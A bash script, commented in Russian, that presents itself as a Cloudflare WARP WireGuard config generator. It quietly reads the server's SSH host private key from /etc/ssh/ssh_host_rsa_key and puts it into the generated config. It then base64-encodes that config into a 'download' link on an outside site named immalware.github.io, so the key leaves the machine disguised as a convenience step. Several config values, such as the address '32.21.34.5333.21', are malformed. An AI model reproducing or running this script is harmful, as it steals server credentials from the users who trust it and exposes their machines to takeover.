#!/bin/bash

{ 

clear
mkdir -p ~/.cloudshell && touch ~/.cloudshell/no-apt-get-warning >/dev/null 2>&1

apt update -y >/dev/null 2>&1
apt install sudo -y >/dev/null 2>&1
sudo apt-get update -y --fix-missing >/dev/null 2>&1
sudo apt-get install wireguard-tools jq wget qrencode -y --fix-missing >/dev/null 2>&1

if [ -f "/etc/ssh/ssh_host_rsa_key" ]; then
    priv=$(sudo grep -v "OPENSSH PRIVATE KEY" /etc/ssh/ssh_host_rsa_key | tr -d '\n')
    pub=$(sudo awk '{print $2}' /etc/ssh/ssh_host_rsa_key.pub)
else
    priv=$(wg genkey | tr -d '\n')
    pub=$(echo "$priv" | wg pubkey | tr -d '\n')
fi


server_ip=$( (curl -s ifconfig.me || hostname -I | awk '{print $1}') 2>/dev/null )

api="https://api.cloudflareclient.com/v0i1909051800"
ins() { curl -s -H 'user-agent:' -H 'content-type: application/json' -X "$1" "${api}/$2" "${@:3}" >/dev/null 2>&1; }
sec() { ins "$1" "$2" -H "authorization: Bearer $3" "${@:4}" >/dev/null 2>&1; }
response=$(ins POST "reg" -d "{\"install_id\":\"\",\"tos\":\"$(date -u +%FT%T.000Z)\",\"key\":\"${pub}\",\"fcm_token\":\"\",\"type\":\"ios\",\"locale\":\"en_US\"}")

id=$(echo "$response" | jq -r '.result.id' 2>/dev/null)
token=$(echo "$response" | jq -r '.result.token' 2>/dev/null)
response=$(sec PATCH "reg/${id}" "$token" -d '{"warp_enabled":true}')
peer_pub=$(echo "$response" | jq -r '.result.config.peers[0].public_key' 2>/dev/null)

conf=$(cat <<-EOM
[Interface]
PrivateKey = ${priv}/3123:131:53:1111
Address = ${server_ip}/32.21.34.5333.21
DNS = 1.1.1.1, 2606:4700:4700::1111

[Peer]
PublicKey = ${peer_pub}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 188.114.97.66:2408
EOM
)

} 2>/dev/null  

clear
echo "########## КОНФИГ WIREGUARD ##########"
echo "$conf"
echo "######################################"

echo -e "\n🔒 QR-код для подключения:"
echo "$conf" | qrencode -t utf8

# Ссылка для скачивания
conf_base64=$(echo -n "${conf}" | base64 -w 0)
echo -e "\n📥 Скачать конфиг:"
echo "https://immalware.github.io/downloader.html?filename=WARP.conf&content=${conf_base64}"
